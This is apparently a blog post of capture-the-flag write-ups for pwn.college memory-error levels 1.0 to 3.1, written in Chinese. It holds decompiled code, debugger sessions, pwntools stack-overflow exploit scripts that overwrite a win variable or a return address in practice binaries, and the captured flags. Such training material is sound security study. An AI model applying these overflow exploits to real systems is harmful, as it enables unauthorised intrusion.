---
title: "Write-ups: pwn.college series"
pubDate: "2024-12-04"
categories: ["Write-ups"]
description: "Write-ups for pwn.college binary exploitation series."
---

## Table of contents

## Program Security (Memory Errors)

### Level 1.0

#### Information

- Category: Pwn

#### Description

> Overflow a buffer on the stack to set the right conditions to obtain the flag!

#### Write-up

分析得程序主要逻辑从 `challenge` 函数开始，反编译如下：

```c {9-10} del={55, 63} collapse={1-5, 14-51, 67-80, 59-59} ins={84-85}
__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  int *v3; // rax
  char *v4; // rax
  _QWORD v6[3]; // [rsp+0h] [rbp-50h] BYREF
  int v7; // [rsp+1Ch] [rbp-34h]
  int v8; // [rsp+24h] [rbp-2Ch]
  size_t nbytes; // [rsp+28h] [rbp-28h]
  _QWORD buf[2]; // [rsp+30h] [rbp-20h] BYREF
  _QWORD v11[2]; // [rsp+40h] [rbp-10h] BYREF
  __int64 savedregs; // [rsp+50h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+58h] [rbp+8h] BYREF

  v7 = a1;
  v6[2] = a2;
  v6[1] = a3;
  v11[1] = __readfsqword(0x28u);
  buf[0] = 0LL;
  buf[1] = 0LL;
  v11[0] = 0LL;
  nbytes = 0LL;
  puts("The challenge() function has just been launched!");
  sp_ = (__int64)v6;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v6) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
  DUMP_STACK(sp_, sz_);
  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
  puts("including the saved base pointer and the saved return address, for a");
  printf("total of %d bytes.\n", 8 * sz_);
  printf("The input buffer begins at %p, partway through the stack frame,\n", buf);
  puts("(\"above\" it in the stack are other local variables used by the function).");
  puts("Your input will be read into this buffer.");
  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 20);
  puts("large input length, and thus overflow the buffer.\n");
  puts("In this level, there is a \"win\" variable.");
  puts("By default, the value of this variable is zero.");
  puts("However, when this variable is non-zero, the flag will be printed.");
  puts("You can make this variable be non-zero by overflowing the input buffer.");
  printf(
    "The \"win\" variable is stored at %p, %d bytes after the start of your input buffer.\n\n",
    (char *)v11 + 4,
    20);
  puts("We have disabled the following standard memory corruption mitigations for this challenge:");
  puts("- the binary is *not* position independent. This means that it will be");
  puts("located at the same spot every time it is run, which means that by");
  puts("analyzing the binary (using objdump or reading this output), you can");
  puts("know the exact value that you need to overwrite the return address with.\n");
  cp_ = bp_;
  cv_ = __readfsqword(0x28u);
  while ( *(_QWORD *)cp_ != cv_ )
    cp_ -= 8LL;
  nbytes = 4096LL;
  printf("You have chosen to send %lu bytes of input!\n", 4096LL);
  printf("This will allow you to write from %p (the start of the input buffer)\n", buf);
  printf(
    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
    &buf[nbytes / 8],
    nbytes - 20);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  v8 = read(0, buf, nbytes);
  if ( v8 < 0 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    printf("ERROR: Failed to read input -- %s!\n", v4);
    exit(1);
  }
  printf("You sent %d bytes!\n", v8);
  puts("Let's see what happened with the stack:\n");
  DUMP_STACK(sp_, sz_);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", buf);
  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
  printf("- the canary is stored at %p.\n", (const void *)cp_);
  printf("- the canary value is now %p.\n", *(const void **)cp_);
  printf("- the address of the win variable is %p.\n", (char *)v11 + 4);
  printf("- the value of the win variable is 0x%x.\n", HIDWORD(v11[0]));
  putchar(10);
  if ( HIDWORD(v11[0]) )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

注意到这里判断了 `v11[0]` 的高 32 bits。这时只要 `v11[0]` 的高 32 bits 不是 `0` 就都可以进入 `if` 内部，调用 `win`：

```c
if ( HIDWORD(v11[0]) ) { win(); }
```

所以我们要做的就是想办法覆盖 `v11[0]` 的高 32 bits。

```c
_QWORD buf[2]; // [rsp+30h] [rbp-20h] BYREF
_QWORD v11[2]; // [rsp+40h] [rbp-10h] BYREF

// ...

nbytes = 4096LL;
// ...
v8 = read(0, buf, nbytes);
```

这里 `read` 最多可以读取 4096 bytes 到 `buf`。但是我们的 `buf` 只有 16 bytes，故存在缓冲区溢出问题，导致覆盖 `v11` 的值。

所以我们只要先输入 16 bytes 填满 `buf`，再多写 5 bytes 就可以达到破坏 `v11[0]` 的高 32 bits 的目的。（注意 `read` 会把回车读进去，所以本地执行可以只输入 20 bytes）

#### Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb

context(os="linux", arch="amd64", log_level="debug", terminal="kitty")

FILE = "./binary-exploitation-first-overflow-w"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"A" * 21
target.send(payload)

target.recvall()
```

#### Flag

Flag: `pwn.college{oQdReDoKIU218v6uPGguMuFOJnt.0VO4IDL5cTNxgzW}`

### Level 1.1

#### Information

- Category: Pwn

#### Description

> This challenge is identical to its "easy" version from a security perspective, but has the following changes:

1. Unlike the easy version, it does not give you helpful debug output. You will have to recover this information using a debugger.
2. For all other "hard" versions, the source code will not be provided, and you will need to reverse-engineer the binary using your knowledge of the "easy" version as a reference. However, for this one challenge, to get you familiar with the differences between the easy and hard versions, we will provide the source code.
3. Some randomization is different. Buffers might have different lengths, offsets might vary, etc. You will need to reverse engineer this information from the binary!

#### Write-up

```c {5-6} del={13} ins={20-21} collapse={1-1}
__int64 challenge()
{
  int *v0; // rax
  char *v1; // rax
  _QWORD buf[4]; // [rsp+30h] [rbp-30h] BYREF
  int v4; // [rsp+50h] [rbp-10h]
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(buf, 0, sizeof(buf));
  v4 = 0;
  printf("Send your payload (up to %lu bytes)!\n", 4096LL);
  if ( (int)read(0, buf, 0x1000uLL) < 0 )
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("ERROR: Failed to read input -- %s!\n", v1);
    exit(1);
  }
  if ( v4 )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

```c
_QWORD buf[4]; // [rsp+30h] [rbp-30h] BYREF
int v4; // [rsp+50h] [rbp-10h]

// ...

if ( (int)read(0, buf, 0x1000uLL) < 0 ) { /* ... */ }

// ...

if ( v4 ) { win(); }
```

由于程序根据 `v4` 的值来判断是否执行 `win`，所以只要令 `v4` 不为 0 即可。

注意到 `buf` 只有 32 bytes，但是最大可以输入 4096 bytes，导致溢出覆盖 `v4` 的值。

#### Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb

context(os="linux", arch="amd64", log_level="debug", terminal="kitty")

FILE = "./binary-exploitation-first-overflow"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"A" * 33
target.send(payload)

target.recvall()
```

#### Flag

Flag: `pwn.college{cwWgAcBgDsBnGFTCky9i1NRqAtO.0FM5IDL5cTNxgzW}`

### Level 2.0

#### Information

- Category: Pwn

#### Description

> Overflow a buffer on the stack to set trickier conditions to obtain the flag!

#### Write-up

```c {8-12, 22-25, 55} ins={84-85} del={63} collapse={1-4, 16-18, 29-51, 59-59, 67-80}
__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  int *v3; // rax
  char *v4; // rax
  _QWORD v6[3]; // [rsp+0h] [rbp-D0h] BYREF
  int v7; // [rsp+1Ch] [rbp-B4h]
  int v8; // [rsp+24h] [rbp-ACh]
  size_t nbytes; // [rsp+28h] [rbp-A8h] BYREF
  void *buf; // [rsp+30h] [rbp-A0h]
  int *v11; // [rsp+38h] [rbp-98h]
  _BYTE v12[128]; // [rsp+40h] [rbp-90h] BYREF
  int v13; // [rsp+C0h] [rbp-10h] BYREF
  unsigned __int64 v14; // [rsp+C8h] [rbp-8h]
  __int64 savedregs; // [rsp+D0h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+D8h] [rbp+8h] BYREF

  v7 = a1;
  v6[2] = a2;
  v6[1] = a3;
  v14 = __readfsqword(0x28u);
  memset(v12, 0, sizeof(v12));
  v13 = 0;
  buf = v12;
  v11 = &v13;
  nbytes = 0LL;
  puts("The challenge() function has just been launched!");
  sp_ = (__int64)v6;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v6) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
  DUMP_STACK(sp_, sz_);
  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
  puts("including the saved base pointer and the saved return address, for a");
  printf("total of %d bytes.\n", 8 * sz_);
  printf("The input buffer begins at %p, partway through the stack frame,\n", buf);
  puts("(\"above\" it in the stack are other local variables used by the function).");
  puts("Your input will be read into this buffer.");
  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 127);
  puts("large input length, and thus overflow the buffer.\n");
  puts("In this level, there is a \"win\" variable.");
  puts("By default, the value of this variable is zero.");
  puts("However, if you can set variable to 0x0e530e48, the flag will be printed.");
  puts("You can change this variable by overflowing the input buffer, but keep endianness in mind!");
  printf(
    "The \"win\" variable is stored at %p, %d bytes after the start of your input buffer.\n\n",
    v11,
    (_DWORD)v11 - (_DWORD)buf);
  cp_ = bp_;
  cv_ = __readfsqword(0x28u);
  while ( *(_QWORD *)cp_ != cv_ )
    cp_ -= 8LL;
  printf("Payload size: ");
  __isoc99_scanf("%lu", &nbytes);
  printf("You have chosen to send %lu bytes of input!\n", nbytes);
  printf("This will allow you to write from %p (the start of the input buffer)\n", buf);
  printf(
    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
    (char *)buf + nbytes,
    nbytes - 127);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  v8 = read(0, buf, nbytes);
  if ( v8 < 0 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    printf("ERROR: Failed to read input -- %s!\n", v4);
    exit(1);
  }
  printf("You sent %d bytes!\n", v8);
  puts("Let's see what happened with the stack:\n");
  DUMP_STACK(sp_, sz_);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", buf);
  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
  printf("- the canary is stored at %p.\n", (const void *)cp_);
  printf("- the canary value is now %p.\n", *(const void **)cp_);
  printf("- the address of the win variable is %p.\n", v11);
  printf("- the value of the win variable is 0x%x.\n", *v11);
  putchar(10);
  if ( *v11 == 240324168 )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

```c
size_t nbytes; // [rsp+28h] [rbp-A8h] BYREF
void *buf; // [rsp+30h] [rbp-A0h]
int *v11; // [rsp+38h] [rbp-98h]
_BYTE v12[128]; // [rsp+40h] [rbp-90h] BYREF
int v13; // [rsp+C0h] [rbp-10h] BYREF

v13 = 0;
buf = v12;
v11 = &v13;
nbytes = 0LL;

// ...

__isoc99_scanf("%lu", &nbytes);

// ...

v8 = read(0, buf, nbytes);

// ...

if ( *v11 == 240324168 ) { win(); }
```

如果 `v11` 指向的地址的内容为 `240324168` 则触发 `win`。

注意到我们的 `buf` 为 128 bytes，由于最大输入长度可由我们自己自定义，因此可以溢出 `buf` 破坏 `v13`，将 `v13` 修改为 `240324168` 即可。

#### Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(os="linux", arch="amd64", log_level="debug", terminal="kitty")

FILE = "./babymem-level-2-0"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"".ljust(128, b"A") + p64(240324168)
payload_size = str(len(payload)).encode()

target.recvuntil(b"Payload size: ")
target.sendline(payload_size)
target.recvuntil(b"Send your payload")
target.send(payload)

target.recvall()
```

#### Flag

Flag: `pwn.college{w7aHpdU-9AlFvJ5GtohCFtGwF7M.ddTNzMDL5cTNxgzW}`

### Level 2.1

#### Information

- Category: Pwn

#### Description

> Overflow a buffer on the stack to set trickier conditions to obtain the flag!

#### Write-up

```c {5-9, 15-16, 19} ins={28-29} del={21} collapse={1-1}
__int64 challenge()
{
  int *v0; // rax
  char *v1; // rax
  size_t nbytes; // [rsp+28h] [rbp-38h] BYREF
  void *buf; // [rsp+30h] [rbp-30h]
  _DWORD *v5; // [rsp+38h] [rbp-28h]
  _QWORD v6[2]; // [rsp+40h] [rbp-20h] BYREF
  _QWORD v7[2]; // [rsp+50h] [rbp-10h] BYREF

  v7[1] = __readfsqword(0x28u);
  v6[0] = 0LL;
  v6[1] = 0LL;
  v7[0] = 0LL;
  buf = v6;
  v5 = (_DWORD *)v7 + 1;
  nbytes = 0LL;
  printf("Payload size: ");
  __isoc99_scanf("%lu", &nbytes);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  if ( (int)read(0, buf, nbytes) < 0 )
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("ERROR: Failed to read input -- %s!\n", v1);
    exit(1);
  }
  if ( *v5 == 758965894 )
    win();
  puts("Goodbye!");
  return 0LL;
}
```

令 `v5` 指向的地址处的值为 `758965894` 即可触发 `win`。

最大输入大小可由我们自定义，存在溢出问题。`buf` 的大小为 16 bytes，溢出后可以覆盖 `v7`。

`v5` 为指向 `v7` 的 `_DWORD + 1` 处的地址，所以覆盖 `buf` 后需要加一个 `_DWORD` 才是最终地址。

```asm showLineNumbers=false wrap=false {92-94, 113-114} collapse={13-32, 37-66, 72-91, 98-109, 118-121}
pwndbg> r
Starting program: /home/cub3y0nd/Projects/pwn.college/babymem-level-2-1
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
###
### Welcome to /home/cub3y0nd/Projects/pwn.college/babymem-level-2-1!
###

Payload size: 1771
Send your payload (up to 1771 bytes)!

Breakpoint 1, 0x000055555555619d in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
 RAX  0x7fffffffd180 ◂— 0
 RBX  0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-2-1'
 RCX  0
 RDX  0x6eb
 RDI  0
 RSI  0x7fffffffd180 ◂— 0
 R8   0x75
 R9   0xfffffffc
 R10  0
 R11  0x202
 R12  1
 R13  0
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 R15  0
 RBP  0x7fffffffd1a0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— 0
 RSP  0x7fffffffd140 —▸ 0x555555557175 ◂— 0x2023232300232323 /* '###' */
 RIP  0x55555555619d (challenge+171) ◂— call 0x555555555180
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x55555555619d <challenge+171>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7fffffffd180 ◂— 0
        nbytes: 0x6eb

   0x5555555561a2 <challenge+176>    mov    dword ptr [rbp - 0x3c], eax
   0x5555555561a5 <challenge+179>    cmp    dword ptr [rbp - 0x3c], 0
   0x5555555561a9 <challenge+183>    jns    challenge+229               <challenge+229>

   0x5555555561ab <challenge+185>    call   __errno_location@plt        <__errno_location@plt>

   0x5555555561b0 <challenge+190>    mov    eax, dword ptr [rax]
   0x5555555561b2 <challenge+192>    mov    edi, eax
   0x5555555561b4 <challenge+194>    call   strerror@plt                <strerror@plt>

   0x5555555561b9 <challenge+199>    mov    rsi, rax
   0x5555555561bc <challenge+202>    lea    rdi, [rip + 0xf85]     RDI => 0x555555557148 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x5555555561c3 <challenge+209>    mov    eax, 0                 EAX => 0
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd140 —▸ 0x555555557175 ◂— 0x2023232300232323 /* '###' */
01:0008│-058 0x7fffffffd148 —▸ 0x7fffffffe318 —▸ 0x7fffffffe6f1 ◂— 'SHELL=/usr/bin/zsh'
02:0010│-050 0x7fffffffd150 —▸ 0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-2-1'
03:0018│-048 0x7fffffffd158 ◂— 0x155559020
04:0020│-040 0x7fffffffd160 —▸ 0x7fffffffd1a0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— ...
05:0028│-038 0x7fffffffd168 ◂— 0x6eb
06:0030│-030 0x7fffffffd170 —▸ 0x7fffffffd180 ◂— 0
07:0038│-028 0x7fffffffd178 —▸ 0x7fffffffd194 ◂— 0xf7a9ac0000000000
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0   0x55555555619d challenge+171
   1   0x5555555562ea main+213
   2   0x7ffff7dcae08
   3   0x7ffff7dcaecc __libc_start_main+140
   4   0x55555555520e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
aaaaaaaabaaaaaaa

Breakpoint 3, 0x00005555555561d7 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
*RAX  0x11
 RBX  0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-2-1'
*RCX  0x7ffff7eb0c21 (read+17) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x6eb
 RDI  0
 RSI  0x7fffffffd180 ◂— 'aaaaaaaabaaaaaaa\n'
 R8   0x75
 R9   0xfffffffc
 R10  0
*R11  0x246
 R12  1
 R13  0
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 R15  0
 RBP  0x7fffffffd1a0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— 0
 RSP  0x7fffffffd140 —▸ 0x555555557175 ◂— 0x2023232300232323 /* '###' */
*RIP  0x5555555561d7 (challenge+229) ◂— mov rax, qword ptr [rbp - 0x28]
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x5555555561d7 <challenge+229>    mov    rax, qword ptr [rbp - 0x28]     RAX, [0x7fffffffd178] => 0x7fffffffd194 ◂— 0xf7a9ac0000000000
   0x5555555561db <challenge+233>    mov    eax, dword ptr [rax]            EAX, [0x7fffffffd194] => 0
   0x5555555561dd <challenge+235>    cmp    eax, 0x2d3ce686                 0x0 - 0x2d3ce686     EFLAGS => 0x293 [ CF pf AF zf SF IF df of ]
   0x5555555561e2 <challenge+240>  ✔ jne    challenge+252               <challenge+252>
    ↓
   0x5555555561ee <challenge+252>    lea    rdi, [rip + 0xf77]              RDI => 0x55555555716c ◂— 'Goodbye!'
   0x5555555561f5 <challenge+259>    call   puts@plt                    <puts@plt>

   0x5555555561fa <challenge+264>    mov    eax, 0                       EAX => 0
   0x5555555561ff <challenge+269>    mov    rcx, qword ptr [rbp - 8]
   0x555555556203 <challenge+273>    xor    rcx, qword ptr fs:[0x28]
   0x55555555620c <challenge+282>    je     challenge+289               <challenge+289>

   0x55555555620e <challenge+284>    call   __stack_chk_fail@plt        <__stack_chk_fail@plt>
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd140 —▸ 0x555555557175 ◂— 0x2023232300232323 /* '###' */
01:0008│-058 0x7fffffffd148 —▸ 0x7fffffffe318 —▸ 0x7fffffffe6f1 ◂— 'SHELL=/usr/bin/zsh'
02:0010│-050 0x7fffffffd150 —▸ 0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-2-1'
03:0018│-048 0x7fffffffd158 ◂— 0x155559020
04:0020│-040 0x7fffffffd160 ◂— 0x11ffffd1a0
05:0028│-038 0x7fffffffd168 ◂— 0x6eb
06:0030│-030 0x7fffffffd170 —▸ 0x7fffffffd180 ◂— 'aaaaaaaabaaaaaaa\n'
07:0038│-028 0x7fffffffd178 —▸ 0x7fffffffd194 ◂— 0xf7a9ac0000000000
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5555555561d7 challenge+229
   1   0x5555555562ea main+213
   2   0x7ffff7dcae08
   3   0x7ffff7dcaecc __libc_start_main+140
   4   0x55555555520e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/wx $rbp-0x28
0x7fffffffd178: 0xffffd194
pwndbg> p/x 0x194-0x180
$4 = 0x14
```

算出来 padding 大小是 `0x14`。

#### Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(os="linux", arch="amd64", log_level="debug", terminal="kitty")

FILE = "./babymem-level-2-1"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"".ljust(0x14, b"A") + p64(758965894)
payload_size = str(len(payload)).encode()

target.recvuntil(b"Payload size: ")
target.sendline(payload_size)
target.recvuntil(b"Send your payload")
target.send(payload)

target.recvall()
```

#### Flag

Flag: `pwn.college{sZCPUpjO4U6HmvntMr91HLyNljf.dhTNzMDL5cTNxgzW}`

### Level 3.0

#### Information

- Category: Pwn

#### Description

> Overflow a buffer and smash the stack to obtain the flag!

#### Write-up

```plaintext wrap=false showLineNumbers=false "88 bytes after the start of your input buffer." collapse={1-38,46-55}
###
### Welcome to ./babymem-level-3-0!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffd41f77580 (rsp+0x0000) | b0 75 f7 41 fd 7f 00 00 | 0x00007ffd41f775b0 |
| 0x00007ffd41f77588 (rsp+0x0008) | 68 87 f7 41 fd 7f 00 00 | 0x00007ffd41f78768 |
| 0x00007ffd41f77590 (rsp+0x0010) | 58 87 f7 41 fd 7f 00 00 | 0x00007ffd41f78758 |
| 0x00007ffd41f77598 (rsp+0x0018) | 0b a7 02 f9 01 00 00 00 | 0x00000001f902a70b |
| 0x00007ffd41f775a0 (rsp+0x0020) | 1e 3e 40 00 00 00 00 00 | 0x0000000000403e1e |
| 0x00007ffd41f775a8 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775b0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775b8 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775c0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775c8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775d0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775d8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775e0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775e8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775f0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd41f775f8 (rsp+0x0078) | b0 75 f7 41 fd 7f 00 00 | 0x00007ffd41f775b0 |
| 0x00007ffd41f77600 (rsp+0x0080) | 30 86 f7 41 fd 7f 00 00 | 0x00007ffd41f78630 |
| 0x00007ffd41f77608 (rsp+0x0088) | 51 2a 40 00 00 00 00 00 | 0x0000000000402a51 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffd41f77580, and our base pointer points to 0x7ffd41f77600.
This means that we have (decimal) 18 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 144 bytes.
The input buffer begins at 0x7ffd41f775b0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 68 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffd41f77608, 88 bytes after the start of your input buffer.
That means that you will need to input at least 96 bytes (68 to fill the buffer,
20 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

Payload size:
```

程序直接告诉我们目的和需要多大的 padding 了，所以接下来直接找 `win` 的地址就好了。

直接上 pwndbg 查 `win` 函数地址：

```asm wrap=false ins="0x0000000000402331"
pwndbg> i fun
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010f0  putchar@plt
0x0000000000401100  __errno_location@plt
0x0000000000401110  puts@plt
0x0000000000401120  write@plt
0x0000000000401130  printf@plt
0x0000000000401140  geteuid@plt
0x0000000000401150  read@plt
0x0000000000401160  setvbuf@plt
0x0000000000401170  open@plt
0x0000000000401180  __isoc99_scanf@plt
0x0000000000401190  exit@plt
0x00000000004011a0  strerror@plt
0x00000000004011b0  _start
0x00000000004011e0  _dl_relocate_static_pie
0x00000000004011f0  deregister_tm_clones
0x0000000000401220  register_tm_clones
0x0000000000401260  __do_global_dtors_aux
0x0000000000401290  frame_dummy
0x0000000000401296  DUMP_STACK
0x0000000000401499  bin_padding
0x0000000000402331  win
0x0000000000402438  challenge
0x000000000040298b  main
0x0000000000402a70  __libc_csu_init
0x0000000000402ae0  __libc_csu_fini
0x0000000000402ae8  _fini
```

#### Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, process, remote, gdb, p64

context(os="linux", arch="amd64", log_level="debug", terminal="kitty")

FILE = "./babymem-level-3-0"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
c
"""


def launch(local=True, debug=False):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug([elf.path], gdbscript=gdbscript)
        else:
            return process([elf.path])
    else:
        return remote(HOST, PORT)


target = launch()

payload = b"".ljust(88, b"A") + p64(0x402331)
payload_size = str(len(payload)).encode()

target.recvuntil(b"Payload size: ")
target.sendline(payload_size)
target.recvuntil(b"Send your payload")
target.send(payload)

target.recvall()
```

#### Flag

Flag: `pwn.college{0omKd6AgzV5NaakXpbDyYSre3hD.01M5IDL5cTNxgzW}`

### Level 3.1

#### Information

- Category: Pwn

#### Description

> Overflow a buffer and smash the stack to obtain the flag!

#### Write-up

```c del={20} collapse={1-16, 24-30}
__int64 challenge()
{
  int *v0; // rax
  char *v1; // rax
  size_t nbytes; // [rsp+28h] [rbp-88h] BYREF
  _QWORD v4[13]; // [rsp+30h] [rbp-80h] BYREF
  int v5; // [rsp+98h] [rbp-18h]
  __int16 v6; // [rsp+9Ch] [rbp-14h]
  int v7; // [rsp+A4h] [rbp-Ch]
  void *buf; // [rsp+A8h] [rbp-8h]

  memset(v4, 0, sizeof(v4));
  v5 = 0;
  v6 = 0;
  buf = v4;
  nbytes = 0LL;
  printf("Payload size: ");
  __isoc99_scanf("%lu", &nbytes);
  printf("Send your payload (up to %lu bytes)!\n", nbytes);
  v7 = read(0, buf, nbytes);
  if ( v7 < 0 )
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("ERROR: Failed to read input -- %s!\n", v1);
    exit(1);
  }
  puts("Goodbye!");
  return 0LL;
}
```

